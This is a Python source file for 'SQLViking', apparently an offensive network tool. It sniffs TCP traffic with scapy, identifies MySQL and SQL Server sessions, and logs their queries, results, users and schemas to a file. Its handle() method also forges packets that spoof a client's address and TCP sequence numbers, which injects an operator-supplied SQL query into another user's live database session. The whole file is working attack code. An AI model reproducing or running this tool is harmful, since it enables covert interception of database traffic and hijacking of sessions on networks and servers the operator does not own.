import sys,threading,time,logging,os,datetime,signal,binascii
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from Queue import Queue
from sys import path
path.append("databases/")
from constantvalues import *
import mysql,sqlserver

databaseList = {MYSQL:mysql.MySqlDB(), SQLSERV:sqlserver.SqlServerDB()}

pkts=Queue()
queries=Queue()

class Traffic():
	def __init__(self,query=None,result=None):
		self.query = query
		self.result = result
		self.timestamp = datetime.datetime.now()

class Conn():
    def __init__(self,cip,cport,sip,sport,state,nextcseq=-1,nextsseq=-1,db=UNKNOWN):
        self.cip      = cip
        self.cport    = cport
        self.sip      = sip
        self.sport    = sport
        self.db       = db
        self.traffic  = []
        self.frag     = []
        self.state    = state
        self.nextcseq = nextcseq
        self.nextsseq = nextsseq

class DataBase():
    def __init__(self,ip,port,dbType):
        self.ip      = ip
        self.port    = port
        self.name    = ''
        self.dbType  = dbType
        self.traffic = []
        self.users   = []
        self.schemas  = []

    def getType(self):
        if ISMYSQL(self.dbType):
            return 'MySQL'
        elif ISSQLSERV(self.dbType):
            return 'SQL Server'
        else:
            return 'Unknown'

    def addUser(self,u):
        if u not in self.users:
            self.users.append(u)

    def addSchema(self,s):
        if s not in self.schemas:
            self.schemas.append(s)

    def getSchemas(self):
        if len(self.schemas) == 0:
            return "None identified"
        else:
            ret = ''
            for s in self.schemas:
                ret += '%s, '%s
            return ret[:-2]

    def status(self):
        res = "---%s:%s---\n"%(self.ip,self.port)
        res += "Type:\t%s\n"% self.getType()
        res += "Users:\t"
        if len(self.users) > 0:
            for u in self.users:
                res += u+", "
            res = res[:-2]+"\n"
        else:
            res += "no users identified yet\n"
        res += "Schema:\t%s\n"%self.getSchemas()
        res += "\nIdentified traffic:\n"
        for t in self.traffic:
            res += 'Query:\n\t%s\n'%t.query
            res += 'Response:\n%s\n'%t.result
        return res

class AlarmException(Exception):
    pass

class Parse(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.die = False
        self.frag = {}
        self.res = ''
        self.knownConns = []
        self.knownDBs = []
        self.inject = []
        with open('out.txt','w') as f:
            f.write('')

    def run(self):
        global pkts
        while not self.die:
            if not pkts.empty():
                self.handle(pkts.get())

    def dumpResults(self,outfile):
        with open(outfile, 'w') as f:
            f.write('\t\t===SQLViking Results===\n\n')
        with open(outfile,'a') as f:
            for db in self.knownDBs:
                f.write(db.status()+'\n'+'~'*80+'\n')

    def getNumConns(self):
        return len(self.knownConns)

    def getNumDBs(self):
        return len(self.knownDBs)

    def fingerprint(self,pkt):
        for key in databaseList:
            pktType = databaseList[key].isDB(pkt)
            if pktType != UNKNOWN:
                break

        return pktType

    def parse(self,pkts,conn):
        payload = ''
        for p in pkts:
            payload += str(p[TCP].payload)

        if pkts[0][IP].src == conn.sip and pkts[0][TCP].sport == conn.sport: #is response
            self.store(databaseList[conn.db.dbType].parseResp(payload,conn),conn.db.dbType*RESPONSE,conn)
        else: #is request
            self.store(databaseList[conn.db.dbType].parseReq(payload,conn),conn.db.dbType*REQUEST,conn)

    def inConn(self,c,pkt):
        if c.cip == pkt[IP].dst and c.cport == pkt[TCP].dport and c.sip == pkt[IP].src and c.sport == pkt[TCP].sport:
            return RESPONSE
        elif c.cip == pkt[IP].src and c.cport == pkt[TCP].sport and c.sip == pkt[IP].dst and c.sport == pkt[TCP].dport:
            return REQUEST

    def getConn(self,pkt):
        for c in self.knownConns:
            if self.inConn(c,pkt):
                return c

    def isKnownDB(self,pkt):
        for db in self.knownDBs:
            if pkt[IP].dst == db.ip and pkt[TCP].dport == db.port: #and db.name == UNKNOWN: TODO: commment code better. why the fuck am i checking if db is unknown?
                return db
            if pkt[IP].src == db.ip and pkt[TCP].sport == db.port: #and db.name == UNKNOWN:
                return db

    def addConn(self,pkt,db=None,state=ESTABLISHED):
        if db:
            if pkt[IP].dst == db.ip and pkt[TCP].dport == db.port: #isReq
                c = Conn(pkt[IP].src,pkt[TCP].sport,pkt[IP].dst,pkt[TCP].dport,nextcseq=len(pkt[TCP].payload)+pkt[TCP].seq,db=db,state=state)
            elif pkt[IP].src == db.ip and pkt[TCP].sport == db.port: #isResp
                c = Conn(pkt[IP].dst,pkt[TCP].dport,pkt[IP].src,pkt[TCP].sport,nextsseq=len(pkt[TCP].payload)+pkt[TCP].seq,db=db,state=state)
        else:
            c = Conn(pkt[IP].src,pkt[TCP].sport,pkt[IP].dst,pkt[TCP].dport,nextcseq=pkt[TCP].seq+1,state=state)

        self.knownConns.append(c) 
        return c   	

    def delConn(self,conn):
        #curently unused as all traffic is tracked in db object, not conn
        #if len(conn.traffic) > 0:
        #    #self.printLn("[*] Moving traffic to DB before deleting conn")
        #    for t in conn.traffic:
        #        conn.db.traffic.append(t)
        self.knownConns.remove(conn)

    def handle(self,pkt):
        #even with TCP filter set on scapy, will occassionally get packets
        #with no TCP layer. throws exception and breaks thread.
        pkts = []
        try:
            pkt[TCP]
        except:
            return

        #self.printLn('[*] pkt payload:\t%s'%self.readable(str(pkt[TCP].payload).encode('hex')))

        c  = self.getConn(pkt)

        if not queries.empty():
            self.inject.append(queries.get())

        if c:
            for i in self.inject:
                if c.db.ip == i[1] and c.db.port == i[2] and pkt[TCP].sport == i[2] and pkt[TCP].flags == 24: #make sure injecting after db response and it isn't a fragged response
                    #self.printLn(databaseList[c.db.dbType].encodeQuery(i[0]).encode('hex'))
                    #sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=16,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload)))
                    sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=24,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload))/databaseList[c.db.dbType].encodeQuery(i[0]))
                    self.inject.remove(i)

        db = self.isKnownDB(pkt)

        if c and pkt[TCP].flags == 17: #FIN/ACK pkt, remove conn
            self.delConn(c)
            return
        elif pkt[TCP].flags == 2 and not c: #SYN pkt
            if db:
                c = self.addConn(pkt,db,state=HANDSHAKE)
            else:
                c = self.addConn(pkt)
            c.nextcseq = pkt[TCP].seq+1
            return
        
        #empty pkt, no reason to parse. scapy sometimes returns empty pkts with [tcp].payload of several '0' values
        if len(pkt[TCP].payload) == 0 or (len(pkt[TCP].payload) <= 16 and str(pkt[TCP].payload).encode('hex') == '00'*len(pkt[TCP].payload)): 
            return

        if not c: #check if conn is being made to a known DB
            db = self.isKnownDB(pkt)
            if db:
                self.printLn("[*] connecting to known db")
                c = self.addConn(pkt,db)
            else:
                self.printLn("[*] connecting to unknown server")

        ip, port, dbType = None, None, None

        if not c or c.db == UNKNOWN:
            pktType = self.fingerprint(str(pkt[TCP].payload))
            if ISRESP(pktType):
                ip = pkt[IP].src
                port = pkt[TCP].sport
            elif ISREQ(pktType):
                ip = pkt[IP].dst
                port = pkt[TCP].dport

            if ISMYSQL(pktType):
                dbType = MYSQL
            elif ISSQLSERV(pktType):
                dbType = SQLSERV

            if ip and port and dbType:
                db = DataBase(ip=ip,port=port,dbType=dbType)
                self.knownDBs.append(db)
                if not c:
                    c = self.addConn(pkt,db)
                else:
                    c.db = db
        
        if c:
            if pkt[IP].src == c.cip and pkt[TCP].sport == c.cport and c.nextcseq != -1 and c.nextcseq != pkt[TCP].seq: #is a bad req
                return
            elif pkt[IP].dst == c.cip and pkt[TCP].dport == c.cport and c.nextsseq != -1 and c.nextsseq != pkt[TCP].seq: #is a bad resp
                return

            if (pkt[TCP].flags >> 3) % 2 == 0: #PSH flag not set, is a fragged pkt. this breaks on data sent over lo interface. scapy does not seem to handle len(pkt)>MTU well. 
                c.frag.append(pkt)
            else:
                if len(c.frag) > 0:
                    for p in c.frag:
                        pkts.append(p)
                    c.frag = []
                pkts.append(pkt)
                if c.db != UNKNOWN:
                    self.parse(pkts,c)

            if pkt[IP].src == c.cip and pkt[TCP].sport == c.cport:
                c.nextcseq = len(pkt[TCP].payload)+pkt[TCP].seq
            else:
                c.nextsseq = len(pkt[TCP].payload)+pkt[TCP].seq

    def validAscii(self,h):
        if int(h,16)>31 and int(h,16)<127:
            return True
        return False

    def readable(self,data):
        a=""
        for i in range(0,len(data),2):
            if self.validAscii(data[i:i+2]):
                a+=data[i:i+2].decode('hex')
        return a

    def formatTuple(self,t):
        res=''
        for i in t:
            res+="%s, "%i
        return res[:-2]

    def printLn(self,msg):
        with open('out.txt','a') as f:
            f.write(msg+'\n')

    def store(self,data,pktType,conn):
        #if conn.db.name == UNKNOWN: #schema unknown, track traffic in conn
        #    if ISRESP(pktType) and len(conn.traffic) > 0 and conn.traffic[-1].result == None: #is result
        #        conn.traffic[-1].result = data
        #    elif ISRESP(pktType): #is result, missed query
        #        conn.traffic.append(Traffic(result=data))
        #    else: #is query
        #        conn.traffic.append(Traffic(query=data))
        #else: #schema known, track traffic in conn.db
        #if len(conn.traffic) > 0:
        #    for t in conn.traffic:
        #        conn.db.traffic.append(t)
        #    conn.traffic = []
        if ISRESP(pktType) and len(conn.db.traffic) > 0 and conn.db.traffic[-1].result == None: #is result
            conn.db.traffic[-1].result = data
        elif ISRESP(pktType): #is result, missed query
            conn.db.traffic.append(Traffic(result=data))
        else: #is query
            conn.db.traffic.append(Traffic(query=data))

    #no longer functions; Parse.res attr deprecated
    def writeln(self,path):
        pass
        #with file(path,'w') as f:
        #    f.write(self.res)

class Scout(threading.Thread):
    def __init__(self):

        threading.Thread.__init__(self)
        self.die = False

    def run(self):
        self.scout()

    def scout(self):
        global pkts
        while not self.die:
            try:
                sniff(prn=lambda x: pkts.put(x),filter="tcp",store=0,timeout=5)
                #sniff(prn=self.queuePkt,filter="tcp",store=0,timeout=5)
            except:
                print sys.exc_info()[1]
                self.die = True

    def queuePkt(self,pkt):
        global pkts
        if pkt[TCP].payload:
            self.printLn("[*] pkt found: src;dst - %s;%s"%(pkt[IP].src,pkt[IP].dst))
            self.printLn("[*] ASCII:\t%s"%self.readable(str(pkt[TCP].payload).encode('hex')))
        pkts.put(pkt)

    def validAscii(self,h):
        if int(h,16)>31 and int(h,16)<127:
            return True
        return False

    def readable(self,data):
        a=""
        for i in range(0,len(data),2):
            if self.validAscii(data[i:i+2]):
                a+=data[i:i+2].decode('hex')
        return a

    def formatTuple(self,t):
        res=''
        for i in t:
            res+="%s, "%i
        return res[:-2]

    def printLn(self,msg):
        with open('out2.txt','a') as f:
            f.write(msg+'\n')

class Pillage(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.die = False

    def run(self):
        global queries
        while not self.die:
            if not queries.empty():
                q = queries.get()


def writeResults(t):
    print('[*] Enter filepath to write to:')
    path = raw_input("> ")
    t.dumpResults(path)  

def printResults():
    print('[*] Results so far:')

def pillage():
    global queries
    print('[*] Enter query to execute:')
    query = raw_input("> ")
    print('[*] Enter IP to execute against:')
    ip = raw_input("> ")
    print('[*] Enter port to execute against:')
    port = raw_input("> ")
    print('[*] Run "%s" against %s:%s? [y/n]'%(query,ip,port))
    ans = raw_input("> ")
    if ans == 'y':
        queries.put([query,ip,port])
        print('[*] Query will run as soon as possible')
    else:
        print('[*] Cancelling...')
    time.sleep(3)

def parseInput(input,t):
    if input == 'w':
        writeResults(t)
    elif input == 'r':
        pillage()
    elif input == 'q':
        raise KeyboardInterrupt
    else:
        print('Unknown command entered')

def wipeScreen():
    y,x = os.popen('stty size', 'r').read().split()
    print('\033[1;1H')
    for i in range(0,int(y)):
        print(' '*int(x))
    print('\033[1;1H')

def alarmHandler(signum, frame):
    raise AlarmException

def nonBlockingRawInput(t, prompt='> ', timeout=5):
    signal.signal(signal.SIGALRM, alarmHandler)
    signal.alarm(timeout)
    try:
        text = raw_input(prompt)
        signal.alarm(0)
        parseInput(text,t)
    except AlarmException:
        printMainMenu(t)
    signal.signal(signal.SIGALRM,signal.SIG_IGN)
    return ''

def printMainMenu(t,wipe=True):
    if wipe:
        wipeScreen()
        y,x = os.popen('stty size', 'r').read().split()
    
    print('{{:^{}}}'.format(x).format('===Welcome to SQLViking==='))
    print('\n[*] Current number of known DBs:\t\t%s'%t.getNumDBs())
    print('[*] Current number of known connections:\t%s'%t.getNumConns())
    print('\n[*] Menu Items:')
    print('\tw - dump current results to file specified')
    print('\tr - run a query against a specified DB (not implemented yet)')
    print('\tq - quit')

def main():
    #TODO: better menu. running counter of reqs/resps capped and DBs discovered.

    t1 = Scout()
    t2 = Parse()
    #t3 = Pillage()
    t1.start()
    t2.start()
    #t3.start()

    while True:
        printMainMenu(t2)
        try:
            nonBlockingRawInput(t2)
        except KeyboardInterrupt:
            print('\n[!] Shutting down...')
            t1.die = True
            t2.die = True
            #t3.die = True
            break

        #except:
            #t1.die = True
            #t2.die = True
            #t3.die = True
            #print sys.exc_info()[1]
            #break

if __name__ == "__main__":
    main()
